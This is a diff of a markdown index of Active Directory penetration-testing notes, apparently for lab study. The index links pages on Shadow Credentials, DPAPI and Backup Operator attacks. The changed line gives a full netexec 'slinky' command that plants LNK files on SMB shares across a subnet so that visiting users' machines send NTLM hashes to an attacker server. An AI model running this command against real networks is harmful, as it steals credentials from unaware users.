@@ -19,7 +19,7 @@
     - [AddKeyCredentialLink/Shadow Credentials Attack](./addKeyCredentialLink.md)
     - [Backup Operator to Domain Admin](./backupOperatorToDomainAdmin.md)
     - [DPAPI Attack](./dpapiAttack.md)
-- [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`
+- [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `nxc smb 172.16.139.0/24 -u 'pthorpe' -p creds.txt -M slinky -o SERVER=172.16.139.10 NAME=urgent`
     - Código:
 
     ```powershell
